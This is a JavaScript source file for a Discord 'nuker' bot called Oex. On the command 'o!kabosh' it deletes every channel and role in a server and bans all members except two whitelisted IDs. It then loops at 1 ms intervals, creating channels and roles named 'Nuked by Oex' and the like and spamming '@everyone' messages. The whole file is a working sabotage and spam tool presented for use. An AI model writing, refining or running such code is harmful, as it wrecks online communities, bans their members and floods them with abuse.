"use strict";

// Dependencies
const discord = require("discord.js")

// Variables
const bot = new discord.Client()

const Oex = {
    delay: 1, // Milliseconds
    prefix: "o!",
    names: [
        "All hail Oex",
        "Oex the nuker",
        "Oex the Rex alternative"
    ],
    messages: [
        "All hail Oex",
        "Nuked by Oex",
        "Server has been kaboshed by Oex"
    ],
    whitelist: [
        904506957447172097, // Bot itself, just incase
        882891618473091082, // I2rys
    ],
    token: ""
}

// Main
bot.on("ready", ()=>{
    console.log("Oex is running.")
})

bot.on("message", (message)=>{
    if(message.content === `${Oex.prefix}kabosh`){
        try{
			const members = message.guild.members.cache.map((channel) => channel)
			const roles = message.guild.roles.cache.map((role) => role)
			var channels = message.guild.channels.cache.map((channel) => channel)

			channels.forEach((channel)=>{
				try{
					channel.delete()
					console.log(`Successfully deleted. Channel: ${channel.name}`)
				}catch{}
			})

			members.forEach((member)=>{
				try{
					if(Oex.whitelist.indexOf(+member.id) === -1){
						member.ban()
						console.log(`Successfully banned. Member: ${member.user.tag}`)
					}
				}catch{}
			})

			roles.forEach((role)=>{
				try{
					role.delete()
					console.log(`Successfully deleted. Role: ${role.name}`)
				}catch{}
			})

			setInterval(async function(){
				const randomName = Oex.names[Math.floor(Math.random() * Oex.names.length)]

				try{
					const channel = message.guild.channels.create(randomName, { type: "text" })

					channel.then((channel)=>{
						console.log(`Successfully created. Channel: ${channel.name}`)

						setInterval(function(){
							const randomMessage = Oex.messages[Math.floor(Math.random() * Oex.messages.length)]
							channel.send(`@everyone ${randomMessage}`)
						}, Oex.delay)
					}).catch(()=>{})
				}catch{}

				try{
					const role = message.guild.roles.create({
						data: {
							name: randomName,
							permissions: [],
							color: "PINK"
						},
						reason: Oex.messages[Math.floor(Math.random() * Oex.messages.length)]
					})

					role.then((role)=>{console.log(`Successfully created. Role: ${role.name}`)}).catch(()=>{})
				}catch{}
			}, Oex.delay)
		}catch{}
    }
})

bot.login(Oex.token)